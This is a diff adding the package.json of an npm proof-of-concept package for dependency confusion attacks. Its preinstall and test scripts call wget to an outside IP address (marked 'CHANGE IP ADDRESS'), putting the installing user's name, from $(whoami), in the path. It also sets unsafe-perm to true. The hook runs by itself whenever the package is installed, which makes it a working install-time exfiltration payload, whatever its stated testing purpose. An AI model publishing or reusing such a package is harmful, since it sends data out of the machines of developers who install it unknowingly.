@@ -1,0 +1,20 @@
+{
+  "name": "dependency-confusion-poc",
+  "version": "1.0.0",
+  "description": "Simple PoC package for testing for dependency confusion vulnerabilities.",
+  "main": "index.js",
+  "scripts": {
+    "test": "wget --quiet http://8.8.8.8/$(whoami) # CHANGE IP ADDRESS",
+    "preinstall": "wget --quiet http://8.8.8.8/$(whoami) # CHANGE IP ADDRESS"
+  },
+  "keywords": [
+    "test",
+    "PoC"
+  ],
+  "dependencies": {},
+  "config": {
+    "unsafe-perm":true
+  },
+  "author": "WayCup",
+  "license": "ISC"
+}
